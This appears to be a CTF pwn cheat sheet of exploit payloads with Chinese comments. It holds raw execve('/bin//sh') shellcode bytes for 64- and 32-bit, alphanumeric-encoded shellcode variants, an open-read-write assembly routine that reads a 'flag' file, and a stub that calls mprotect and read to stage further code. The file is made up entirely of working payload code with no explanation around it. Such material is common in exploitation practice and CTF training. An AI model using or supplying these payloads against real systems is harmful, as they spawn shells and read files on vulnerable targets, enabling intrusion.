# 64位
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
# 32位
shellcode = b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
# 昊哥的
shellcode = b'\x31\xD2\x52\x54\x5E\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x54\x5F\xB0\x3B\x99\x0F\x05'
# 全字母64位
shellcode = b'Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'
# 全字母32位
shellcode = b'PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA'
# 缩短的shellcode_orw 到在线网站编译一下
shellcode_orw = '''
push 0x67616c66
mov rdi,rsp
xor esi,esi
push 2
pop rax
syscall
mov rdi,rax
mov rsi,rsp
mov edx,0x100
xor eax,eax
syscall
mov edi,1
mov rsi,rsp
push 1
pop rax
syscall
'''
#x86 = "\x68\x66\x6c\x61\x67\x48\x89\xe7\x31\xf6\x6a\x02\x58\x0f\x05\x48\x89\xc7\x48\x89\xe6\xba\x00\x01\x00\x00\x31\xc0\x0f\x05\xbf\x01\x00\x00\x00\x48\x89\xe6\x6a\x01\x58\x0f\x05"

# 实现⼀次read和mprotect，cdq指令可以控制dx
shellcode1='''
shl edi,12
mov dx, 0x7
mov ax, 10
syscall
cdq
mov esi, edi
xor edi, edi
xor eax, eax
syscall
'''
